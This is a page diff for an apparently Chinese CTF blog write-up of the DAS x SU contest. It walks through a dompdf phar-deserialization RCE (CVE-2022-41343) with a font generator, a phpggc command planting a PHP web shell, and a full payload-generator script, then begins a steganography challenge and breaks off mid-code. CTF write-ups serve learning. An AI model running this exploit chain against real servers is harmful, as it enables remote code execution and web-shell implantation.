@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DAS x SU - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/das-x-su/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="DAS x SU">
+  <meta property="og:description" content="WEB pdf_converter 大家都非预期了
+发现是ThinkPHP5 的框架
+直接可以随便用公开的payload直接打
+pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
+现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
+正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
+https://buaq.net/go-129526.html跟着文章复现
+直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
+#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DAS x SU">
+  <meta name="twitter:description" content="WEB pdf_converter 大家都非预期了
+发现是ThinkPHP5 的框架
+直接可以随便用公开的payload直接打
+pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
+现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
+正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
+https://buaq.net/go-129526.html跟着文章复现
+直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
+#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/das-x-su/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/dasctf-7%E6%9C%88/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/d3ctf-2023/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DAS x SU",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/das-x-su\/"
+        },"genre": "posts","keywords": "","wordcount":  473 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/das-x-su\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DAS x SU</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;473 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#pdf_converter">pdf_converter</a></li>
+        <li><a href="#pdf_converter_revenge">pdf_converter_revenge</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#secret-of-bkfish">secret of bkfish</a></li>
+        <li><a href="#ge9iansgirl">Ge9ian&rsquo;sGirl</a></li>
+        <li><a href="#七里香">七里香</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="web">WEB</h2>
+<h3 id="pdf_converter">pdf_converter</h3>
+<p>大家都非预期了</p>
+<p>发现是ThinkPHP5 的框架</p>
+<p>直接可以随便用公开的payload直接打</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252005859.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252005859.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252005859.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252005859.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252005859.png"
+        title="image-20230425200558796" /></p>
+<h3 id="pdf_converter_revenge">pdf_converter_revenge</h3>
+<p>这个找cve是找错了，然后访问pdf函数这里还是有迷惑，</p>
+<p>现在知道了是<code>index.php/index/index/pdf</code> 当时一直是尝试<code>index.php/index/pdf</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261655025.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261655025.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261655025.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261655025.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261655025.png"
+        title="image-20230426165523347" /></p>
+<p>正确思路是<code>CVE-2022-41343 - 通过 Phar 反序列化的 RCE</code></p>
+<p><a href="https://buaq.net/go-129526.html" target="_blank" rel="noopener noreffer">https://buaq.net/go-129526.html</a>
+</p>
+<p>跟着文章复现</p>
+<p>直接跑这个脚本，但是有个font库需要安装<code>sudo apt-get install python3-fontforge</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> fontforge
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tempfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Optional
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(do_generate_font())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_generate_font</span>() <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    fd, fn <span style="color:#f92672">=</span> tempfile<span style="color:#f92672">.</span>mkstemp(suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.ttf&#34;</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>close(fd)
+</span></span><span style="display:flex;"><span>    font <span style="color:#f92672">=</span> fontforge<span style="color:#f92672">.</span>font()
+</span></span><span style="display:flex;"><span>    font<span style="color:#f92672">.</span>copyright <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DUMMY FONT&#34;</span>
+</span></span><span style="display:flex;"><span>    font<span style="color:#f92672">.</span>generate(fn)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(fn, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>unlink(fn)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> res
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>获取一个font.ttf文件</p>
+<pre tabindex="0"><code>python3 generate_font.py &gt; font.ttf
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261843641.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261843641.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261843641.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261843641.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261843641.png"
+        title="image-20230426184329540" /></p>
+<p>然后用php+phpggc来获取phar文件，本题是ThinkPHP5</p>
+<pre tabindex="0"><code>php phpggc -l
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261845491.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261845491.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261845491.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261845491.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261845491.png"
+        title="image-20230426184538456" /></p>
+<p>生成phar命令为</p>
+<pre tabindex="0"><code>php -d phar.readonly=0 phpggc ThinkPHP/RCE2 system &#34;echo &#39;&lt;?php system($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/a.php&#34; -p phar -pp font.ttf -o font-polyglot.phar
+</code></pre><p>然后成功生成<code>font-polyglot.phar</code>文件</p>
+<p>最后使用<code>generate_payload.py</code>文件生成payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAYLOAD_TEMPLATE_URL_ENCODED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;style&gt;@font-face+{+font-family:&#39;exploit&#39;;+src:url(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;);+font-weight:&#39;normal&#39;;+font-style:&#39;normal&#39;;}&lt;/style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>PAYLOAD_TEMPLATE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    @font-face {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        font-family:&#39;exploit&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        src:url(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        font-weight:&#39;normal&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        font-style:&#39;normal&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser( prog<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;generate_payload.py&#34;</span>,
+</span></span><span style="display:flex;"><span>                      formatter_class<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> prog: argparse<span style="color:#f92672">.</span>HelpFormatter(prog,max_help_position<span style="color:#f92672">=</span><span style="color:#ae81ff">50</span>),
+</span></span><span style="display:flex;"><span>                      epilog<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                       This script will generate payloads for CVE-2022-41343
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                      &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;file&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Polyglot File&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>, <span style="color:#e6db74">&#34;--path&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Base path to vendor directory (Default = /var/www/)&#34;</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> args
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> get_args()
+</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>file<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(file)):
+</span></span><span style="display:flex;"><span>        generate_payloads(file, path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;ERROR: File doesn&#39;t exist.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_payloads</span>(file, path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        fc <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    b64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(fc)
+</span></span><span style="display:flex;"><span>    data_uri_pure <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;data:text/plain;base64,</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> b64<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    data_uri_double_encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;data:text/plain;base64,</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(b64<span style="color:#f92672">.</span>decode()))
+</span></span><span style="display:flex;"><span>    md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(data_uri_double_encoded)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 计算md5这里，因为大佬这里是两次url编码，但是上传之后服务器接收会解一次url，dompdf真正处理的数据应该是经过一次url解码的数据，所以计算md5需要解一次url编码才是正确的文件名</span>
+</span></span><span style="display:flex;"><span>    phar_uri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;phar://</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/vendor/dompdf/dompdf/lib/fonts/exploit_normal_</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.ttf##&#34;</span> <span style="color:#f92672">%</span> (path,md5)
+</span></span><span style="display:flex;"><span>    req1_enc <span style="color:#f92672">=</span> PAYLOAD_TEMPLATE_URL_ENCODED <span style="color:#f92672">%</span> data_uri_double_encoded
+</span></span><span style="display:flex;"><span>    req2_enc <span style="color:#f92672">=</span> PAYLOAD_TEMPLATE_URL_ENCODED <span style="color:#f92672">%</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(phar_uri)
+</span></span><span style="display:flex;"><span>    req1_pure <span style="color:#f92672">=</span> PAYLOAD_TEMPLATE <span style="color:#f92672">%</span> data_uri_double_encoded
+</span></span><span style="display:flex;"><span>    req2_pure <span style="color:#f92672">=</span> PAYLOAD_TEMPLATE <span style="color:#f92672">%</span> phar_uri
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;====== REQUEST 1 ENCODED =======&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(req1_enc)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;====== REQUEST 2 ENCODED =======&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(req2_enc)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;====== REQUEST 1 NOT ENCODED =======&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(req1_pure)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;====== REQUEST 2 NOT ENCODED =======&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(req2_pure)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><pre tabindex="0"><code>python3 generate_payload.py -p &#34;/var/www/html&#34; font-polyglot.phar
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261855590.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261855590.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261855590.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261855590.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261855590.png"
+        title="image-20230426185507551" /></p>
+<p>发送第一个payload以将多语言文件写入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261858388.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261858388.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261858388.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261858388.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261858388.png"
+        title="image-20230426185832307" /></p>
+<p>发送第二个payload触发phar</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261900357.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261900357.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261900357.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261900357.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304261900357.png"
+        title="image-20230426190013278" /></p>
+<p>写入shell，命令执行</p>
+<h2 id="misc">MISC</h2>
+<h3 id="secret-of-bkfish">secret of bkfish</h3>
+<p>一张png</p>
+<p>原图被分离出了一张一模一样的图片</p>
+<p>看颜色通道是在red 0 通道有信息</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241442192.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241442192.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241442192.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241442192.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241442192.png"
+        title="image-20230424144248592" /></p>
+<p>可以直接根据像素提取二进制</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>img<span style="color:#f92672">=</span>Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">aaa.png&#34;</span>)
+</span></span><span style="display:flex;"><span>width <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>size[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>height <span style="color:#f92672">=</span> img<span style="color:#f92672">.</span>size[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(width):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        pi<span style="color:#f92672">=</span>img<span style="color:#f92672">.</span>getpixel((i,j))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(pi[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#ae81ff">1</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
